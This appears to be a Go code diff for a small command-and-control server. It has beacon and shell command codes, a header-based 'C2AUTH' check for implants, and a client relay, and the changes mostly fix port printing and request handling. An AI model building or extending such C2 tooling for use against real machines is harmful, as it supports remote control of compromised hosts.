@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"strconv"
 )
 
 type User struct {
@@ -13,13 +14,14 @@ type User struct {
 }
 
 const (
-	BEACONS = 0x00000001
-	SHELL   = 0x00000002
+	BEACONS   = 0x00000001
+	SHELL     = 0x00000002
+	NEWBEACON = 0x00000003
 )
 
 func StartC2(uri string, port int, res []byte) {
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
-		iamfrom := r.Header.Get("IAMFORM")
+		iamfrom := r.Header.Get("Iamfrom")
 		if iamfrom == "C2AUTH" {
 			if r.Method == http.MethodPost {
 				body, _ := ioutil.ReadAll(r.Body)
@@ -38,7 +40,7 @@ func StartC2(uri string, port int, res []byte) {
 		}
 
 	})
-	fmt.Println("Server is running on : " + string(port))
+	fmt.Println("Server is running on : " + strconv.Itoa(port))
 	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
 
 }
@@ -46,7 +48,7 @@ func StartC2(uri string, port int, res []byte) {
 func StartClient(uri string, port int) {
 	config, _ := parseConfig("./Client/config.xml")
 	var res []byte // dong tai jie shou 40049
-	go StartC2("", 50049, res)
+	go StartC2("c2", 50049, res)
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
 
 		username := r.Header.Get("Username")
@@ -54,11 +56,14 @@ func StartClient(uri string, port int) {
 
 		if authenticate(username, password, config) {
 			body, _ := ioutil.ReadAll(r.Body)
-
-			Send_Bytes_to(w, body, "http://localhost:8080", expectedHeaders)
-
-			w.WriteHeader(http.StatusOK)
-			w.Write(res)
+			if body == nil {
+				w.WriteHeader(http.StatusOK)
+				w.Write(res)
+			} else {
+				Send_Bytes_to(w, body, "http://localhost:8080", expectedHeaders)
+				w.WriteHeader(http.StatusOK)
+				w.Write(res)
+			}
 
 		} else {
 			w.WriteHeader(http.StatusUnauthorized)
@@ -67,7 +72,7 @@ func StartClient(uri string, port int) {
 		}
 	})
 
-	fmt.Println("Server is running on : " + string(port))
+	fmt.Println("Server is running on : " + strconv.Itoa(port))
 	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
 }
 
